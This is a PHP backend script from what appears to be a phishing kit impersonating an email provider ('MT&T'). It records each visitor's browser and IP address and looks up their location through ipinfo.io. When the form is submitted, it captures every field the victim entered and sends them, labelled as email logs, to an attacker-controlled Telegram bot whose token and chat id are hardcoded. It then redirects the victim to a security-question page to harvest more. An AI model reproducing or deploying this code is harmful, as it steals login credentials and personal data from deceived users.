<?php



if(strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== FALSE)
$browserName = 'Internet explorer';
elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Trident') !== FALSE) //For Supporting IE 11
$browserName = 'Internet explorer';
elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox') !== FALSE)
$browserName = 'Mozilla Firefox';
elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE)
$browserName = 'Google Chrome';
elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== FALSE)
$browserName = "Opera Mini";
elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera') !== FALSE)
$browserName = "Opera";
elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') !== FALSE)
$browserName = "Safari";
else
$browserName = 'Something else';

$ipaddress = '';
$city = '';
$region = '';
$country = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';

    // $ipaddress = '198.7.59.119';
    $json = file_get_contents("http://ipinfo.io/{$ipaddress}/geo");
    $json = json_decode($json, true);
    $country = $json['country'];
    $region = $json['region'];
    $city = $json['city'];
    
if(isset($_POST['submit']))
    {
        $textMessage1 = "";
        foreach($_POST as $variable => $value) {
            $textMessage1 .= $variable."=".$value.chr(10);
        }

        $textMessage2 = "=====MT&T Email: $country : $ipaddress ======".chr(10).$textMessage1."-----------------------------".chr(10)."browser=".$browserName.chr(10)."ip=".$ipaddress.chr(10)."city=".$city.chr(10)."country=".$country.chr(10)."=====Email LOGS========";

        $apiToken = "5098335197:AAG7rYPiZFLcTLFMvWe6-OZxWoHwY4mDw0c";
        $data = [
            'chat_id' => '822152954',
            'text' => $textMessage2
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
        // print_r($response);
    }



mail("","=====MT&T LOG Email: $country : $ipaddress ======", $textMessage2);

header("Location: ../securityQ.html");
exit();
?>